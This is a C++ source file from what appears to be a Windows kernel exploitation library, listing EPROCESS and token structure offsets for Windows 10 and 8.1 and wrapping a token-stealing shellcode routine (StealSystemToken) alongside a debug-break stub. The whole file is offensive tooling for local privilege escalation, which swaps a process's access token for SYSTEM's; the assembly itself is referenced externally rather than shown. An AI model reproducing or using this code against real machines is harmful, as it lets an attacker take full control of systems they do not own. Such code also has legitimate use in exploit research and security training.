#include "Win32/Kernel.hpp"

#include <stdexcept>

#include "Log.hpp"
#include "Utils.hpp"


#if 0
// Win10 RS6 x64
#define CURRENT_ETHREAD 0x0188
#define EPROCESS_OFFSET 0x00b8
#define PROCESSID_OFFSET 0x02e8
#define EPROCESS_FLINK_OFFSET 0x02f0
#define TOKEN_OFFSET 0x0360
#define SYSTEM_PID 4
#endif

// WINDOWS 8.1
#if 0
#define CURRENT_ETHREAD 0x0188
#define EPROCESS_OFFSET 0x00b8
#define PROCESSID_OFFSET 0x02e0
#define FLINK_OFFSET 0x02e8
#define TOKEN_OFFSET 0x0348
#define SYSTEM_PID 0x4
#endif


EXTERN_C_START
void
CopySystemToken();

usize
CopySystemTokenLength();
EXTERN_C_END


namespace pwn::Shellcode::Kernel
{

std::vector<u8>
DebugBreak()
{
    std::vector<u8> res(sizeof(uptr));
    std::fill(res.begin(), res.end(), 0xcc);
    return res;
}


std::vector<u8>
StealSystemToken()
{
    const usize sz = CopySystemTokenLength();
    std::vector<u8> sc(Utils::align(sz, 16));
    std::fill(sc.begin(), sc.end(), 0xcc);
    RtlCopyMemory(sc.data(), &CopySystemToken, sz);
    return sc;
}


} // namespace pwn::Shellcode::Kernel
